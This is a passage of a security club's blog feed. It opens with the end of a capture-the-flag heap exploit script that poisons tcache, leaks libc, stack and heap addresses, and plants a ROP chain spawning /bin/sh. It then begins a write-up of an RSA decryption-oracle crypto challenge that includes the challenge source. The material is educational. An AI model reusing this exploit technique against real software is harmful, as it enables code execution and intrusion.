io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;alloc&lt;/span&gt;(idx, data, size, s&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;):
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()) 
   
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s:
       io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;, data) 
   &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
       io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;, data) 

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;free&lt;/span&gt;(idx):
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;view&lt;/span&gt;(idx):
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;):
    alloc(i, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

view(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;))
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(heap)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# then we defeated safe linking lol&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;):
    free(i)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;)
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;)

free(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)
view(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x219ce0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# - 0x1bebe0 # offset of the unsorted bin&lt;/span&gt;

rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(libc)
binsh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execve(binsh, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

environ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x221200&lt;/span&gt; 
stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21a780&lt;/span&gt;

pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;environ: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(environ)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stdout: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stdout)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;T&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x108&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x111&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64((stdout &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb20&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;))), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x130&lt;/span&gt;)
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TT&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xfbad1800&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

stack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x130&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# - 0x1bebe0 # offset of the unsorted bin&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stack: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stack)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

free(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# large&lt;/span&gt;
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;T&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x108&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x111&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64((stack &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb20&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;))), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x130&lt;/span&gt;)
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TT&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stack) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain(), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# overwrite sRBP for nothing lmao&lt;/span&gt;

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;- https://clubsecu-esiea.github.io/posts/catastrophe/ - Beerware shit</description>
        </item>
    
    
    
        <item>
        <title>[HeroCTF v4 - crypto] How (not) to make a crypto challenge</title>
        <link>https://clubsecu-esiea.github.io/posts/oracles_apprentice/</link>
        <pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://clubsecu-esiea.github.io/posts/oracles_apprentice/</guid>
        <description>ESIEA security club https://clubsecu-esiea.github.io/posts/oracles_apprentice/ -&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# The oracle&#39;s apprentice

Looks like Tiresias, the blind oracle, took a nice long holiday and his apprentice had to cover for him. She&#39;s new to the job so if she forgets anything... you&#39;ll just have to deal with it.

Good luck !

`Format : Hero{flag}`
`Author : Alol` (NB: that&#39;s me !)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;the-premise&#34;&gt;The premise&lt;/h1&gt;
&lt;p&gt;As it turns out I fucked up. The 4th edition of the HeroCTF is about to end after a weekend of everything going surprisingly well. The infrastructure didn&amp;rsquo;t crash, we didn&amp;rsquo;t get DDOSed, we didn&amp;rsquo;t have to deal with cryptominers and everybody generally had a great time. I was the creator of the OSINT challenges and a crypto(graphy) challenge : &lt;code&gt;The oracle&#39;s apprentice&lt;/code&gt;, the subject of this article.&lt;/p&gt;
&lt;p&gt;More than just providing a write-up to the challenge this blogpost will also detail the &lt;em&gt;several&lt;/em&gt; unintended ways the challenge could be solved. These &amp;ldquo;unintendeds&amp;rdquo; are actually textbook RSA vulnerabilities, which makes this article accessible to novices and my shame even greater. If you&amp;rsquo;re only interested in the (intended) solution to this challenge you can jump right to &lt;code&gt;The intended way &lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; getStrongPrime, bytes_to_long
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random

FLAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

encrypt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; m: pow(m, e, n)
decrypt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; c: pow(c, d, n)

e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randrange(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65537&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)	
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getStrongPrime(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;, e&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;e)
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getStrongPrime(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;, e&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;e)

n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; q
φ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (q&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(e, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, φ)

c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt(bytes_to_long(FLAG))

&lt;span style=&#34;color:#75715e&#34;&gt;#print(f&amp;#34;{n=}&amp;#34;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#print(f&amp;#34;{e=}&amp;#34;)&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;c&lt;span style=&#34;color:#e6db74&#34;&gt;=}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
     t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c=&amp;#34;&lt;/span&gt;))
     print(decrypt(t)) &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; t &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The following python source code is given. We can see a rather classical RSA decryption/signing oracle challenge, where a server provides an encrypted flag and decrypts/signs user inputs (the decryption and signing operations in RSA are the same). This oracle however comes with a twist : the players don&amp;rsquo;t get the public key (&lt;code&gt;n&lt;/code&gt; and &lt;code&gt;e&lt;/code&gt;), only the encrypted flag.&lt;/p&gt;
&lt;h1 id=&#34;unintended-n1--n-th-root-attack-small-e&#34;&gt;Unintended n°1 : n-th root attack (small e)&lt;/h1&gt;
&lt;p&gt;Thanks to this vulnerability the challenge was solvable in &amp;hellip; 0 queries. Yes that&amp;rsquo;s right, you didn&amp;rsquo;t even have to send a request to the server since when you connect to the server it first sends the encrypted flag.&lt;/p&gt;
